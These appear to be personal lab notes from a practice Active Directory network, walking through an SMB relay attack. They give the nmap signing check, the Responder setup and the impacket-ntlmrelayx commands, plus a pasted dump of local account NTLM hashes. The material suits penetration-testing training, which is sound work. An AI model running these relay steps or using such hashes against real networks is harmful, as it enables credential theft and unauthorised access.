# On Kali:
---
1. Identify hosts with SMB singin:``
  - `nmap --script=smb2-security-mode.nse -p445 10.0.1.4`
	  - can also do for whole network : `10.0.1.0/24`
	  ![[Pasted image 20250328150412.png]]
1. echo "10.0.1.10 \n 10.0.1.9" > targets.txt
2. Edit responder file and run `responder`:
		![[Pasted image 20250328150900.png]]
3. Setup `ntlm relay`
	1. `impacket-ntlmrelayx -tf targets.txt -smb2support`
   - ![[Pasted image 20250328151105.png]]

# On Spiderman (as MARVEL\fcastle):
---
- Access attacker ip same way from file explorer and get an error:
	![[Pasted image 20250328154816.png]]

# On Kali
---
- Got the hashes:
![[Pasted image 20250328152836.png]]

```
pparker:500:aad3b435b51404eeaad3b435b51404ee:e08e15bd995aa26400e3107deb56bb16:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:7dadd9ba50a9158fa6a8dfd365439b3c:::
Administrator:1000:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::
```

- Interactive mode: `impacket-ntlmrelayx -tf targets.txt -smb2support -i`:
	![[Pasted image 20250328155024.png]]
	![[Pasted image 20250328155038.png]]
![[Pasted image 20250328155131.png]]